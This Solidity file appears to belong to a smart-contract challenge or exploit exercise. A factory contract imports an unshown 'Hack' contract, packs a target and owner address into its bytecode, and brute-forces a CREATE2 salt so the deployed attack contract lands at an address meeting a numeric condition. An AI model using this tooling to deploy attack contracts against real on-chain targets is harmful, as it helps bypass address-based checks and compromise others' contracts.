// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Hack.sol";

contract Factory {
    address public finaladdr;
    uint256 public _salt;

    function getBytecode(address _target, address _owner)
        public
        pure
        returns (bytes memory)
    {
        bytes memory bytecode = type(Hack).creationCode;

        return abi.encodePacked(bytecode, abi.encode(_target, _owner));
    }

    function deploy(bytes memory bytecode) public {
        address addr;
        bytes32 hash;
        uint256 i;
        for (
            i = 0;
            uint256(uint160(address(uint160(uint256(hash))))) % 100 != 10;
            i++
        ) {
            hash = keccak256(
                abi.encodePacked(
                    bytes1(0xff),
                    address(this),
                    i,
                    keccak256(bytecode)
                )
            );
        }

        _salt = i - 1;
        uint256 _salttemp = _salt;

        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salttemp)

            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }

        finaladdr = addr;
    }
}
